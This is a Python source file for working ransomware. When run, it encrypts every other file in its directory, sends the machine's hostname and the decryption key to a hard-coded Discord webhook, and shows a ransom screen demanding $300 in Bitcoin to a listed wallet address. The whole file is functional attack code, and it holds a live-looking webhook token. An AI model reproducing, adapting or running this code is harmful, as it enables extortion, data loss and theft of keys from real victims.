import time
import os
from os.path import exists as file_exists
import socket
from cryptography.fernet import *
import cryptography
from discord_webhook import DiscordWebhook, DiscordEmbed
from binascii import Error
from colorama import Fore, Back, Style

class ransomwareEncrypt:
    def __init__(self):
        self._fileToEncrypt = []
        self.keyGen = Fernet.generate_key()
        self.priceToAsk = "$300"
        self.wallet_url = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
        self.currency = "Bitcoin"
        self.dc_webhook = DiscordWebhook("https://canary.discord.com/api/webhooks/979584793601777664/YDIODdyyITuflKWlqlKtvnxDeAxaRI6bXRGrJ4gUFyW7yV6pp3rwRignY7dpPIVzwNCI")

    def encrypt_files(self):
        classRedirect = ransomwareEncrypt()
        checkAlrdyEncrypted = file_exists("encryptionCheck.txt")
        if checkAlrdyEncrypted == True:
            # Files are already encryted. So switch to the decrypt_files function
            os.system("clear")
            classRedirect.decrypt_files()
        elif checkAlrdyEncrypted == False:
            # If the computes file is not encrypted so let's encrypt it.
            # Create file to compare and check if encryption already exist
            checkEncryptionFile = open("encryptionCheck.txt", "w+")
            for fileInPath in os.listdir():
                if fileInPath == 'ransomware.py' or fileInPath == 'rkey.key' or fileInPath == 'encryptionCheck.txt' or fileInPath == 'requirements.txt' or fileInPath == 'setup.py':
                    continue
                if os.path.isfile(fileInPath):
                        self._fileToEncrypt.append(fileInPath)
            #key = Fernet.generate_key()
            _keyDecode = self.keyGen.decode("utf-8")
            with open("rkey.key", "wb") as thekey:
                thekey.write(self.keyGen)
            for fileInPath in self._fileToEncrypt:
                    with open(fileInPath, "rb") as _newFileInPath:
                        contents = _newFileInPath.read()
                    contents_encrypted = Fernet(self.keyGen).encrypt(contents)
                    with open(fileInPath, "wb") as _newFileInPath:
                        _newFileInPath.write(contents_encrypted)
            classRedirect.discord_webhook(_keyDecode)

    def decrypt_files(self):
        while True:
            os.system('clear')
            print(f"""


                        [41m [30m╦═╗╔═╗╔╗╔╔═╗╔═╗╔╦╗╦ ╦╔═╗╦═╗╔═╗   ╔═╗╦ ╦[39m [49m
                        [41m [30m╠╦╝╠═╣║║║╚═╗║ ║║║║║║║╠═╣╠╦╝║╣    ╠═╝╚╦╝[39m [49m
                        [41m [30m╩╚═╩ ╩╝╚╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩╩╚═╚═╝ o ╩   ╩ [39m [49m


             ╔═══════════════════[ [41m RANSOMWARE.PY [49m ]══════════════════════╗
             ║                                                            ║
             ║       [[31m![39m] [41m ALL OF YOUR FILES HAVE BEEN ENCRYPTED  [49m [[31m![39m]     ║
             ║                                                            ║
             ║     [31mSEND[39m [43m [30m{self.priceToAsk}[39m [49m [31mIN[39m [43m [30m{self.currency}[39m [49m [31mTO THIS WALLET ADDRESS TO [39m    ║
             ║                   [31mGET THE DECRYPT KEY.[39m                     ║
             ║                                                            ║
             ║                   [ [41m WALLET ADDRESS [49m ]                     ║
             ║        [46m {self.wallet_url} [49m        ║
             ║                                                            ║
             ╚════════════════════════════════════════════════════════════╝

            """)
            exit_condition = True
            try:
                w = bytes(input("ENTER THE DECRYPTION KEY : "), encoding='utf-8')
                if len(w) < 32:
                    os.system('clear')
                    print('[[31mINFO[39m] [30m [41m DECRYPTION KEY INCORRECT [49m [39m [[31m-[39m] ')
                    print(Style.RESET_ALL)
                    time.sleep(4)
                    continue
                elif len(w) > 46:
                    print('[[31mINFO[39m] [30m [41m DECRYPTION KEY INCORRECT [49m [39m [[31m-[39m]  ')
                    time.sleep(2)
                    continue
                else:
                    for fileInPath in os.listdir():
                        if fileInPath == 'ransomware.py' or fileInPath == 'rkey.key' or fileInPath == 'encryptionCheck.txt' or fileInPath == 'requirements.txt' or fileInPath == 'setup.py':
                            continue
                        if os.path.isfile(fileInPath):
                            self._fileToEncrypt.append(fileInPath)
                    for fileInPath in self._fileToEncrypt:
                            with open(fileInPath, "rb") as _newFileInPath:
                                contents = _newFileInPath.read()
                            contents_decrypted = Fernet(w).decrypt(contents)
                            with open(fileInPath, "wb") as _newFileInPath:
                                _newFileInPath.write(contents_decrypted)
                            if os.path.exists("encryptionCheck.txt"):
                                os.remove("encryptionCheck.txt")
                            else:
                                pass # pass
                            if os.path.exists("rkey.key"):
                                os.remove("rkey.key")
                            else:
                                pass # pass (yh none optimized code lol)
                    if exit_condition is True:
                        raise UnboundLocalError()
            except cryptography.fernet.InvalidToken:
                # I handle this error because when it shows this error that mean the code is correct due to a character bug
                print("[[32mINFO[39m] [30m [42m ALL YOUR FILE HAVE BEEN DECRYPTED [49m [39m  [[32m+[39m]")
                break
            except (Error, TypeError):
                time.sleep(2)
                pass
            except UnboundLocalError:
                print("[[32mINFO[39m] [30m [42m ALL YOUR FILE HAVE BEEN DECRYPTED [49m[39m[[32m+[39m]")
                break

    def discord_webhook(self, _keyDecode):
        hostname = socket.gethostname()

        newKey = _keyDecode

        embed = DiscordEmbed(description=f'> All information(s) about **"hostname"** and **"decryption key"** to be sure each keys correspond to each user(s). \r\r **\💻 ・ Host Name: **\n `{hostname}` \r\r **\🔐・ Decryption Key : **\n ||`{newKey}`||', color='ff5c5c')
        embed.set_author(name='RansomWare - By Zaqo')
        embed.set_footer(text='Ransomware - Python By Zaqo')
        embed.set_thumbnail(url='https://i.ibb.co/JsrrpRg/Background-1.png')

        self.dc_webhook.add_embed(embed)
        response = self.dc_webhook.execute()

w = ransomwareEncrypt()
w.encrypt_files()
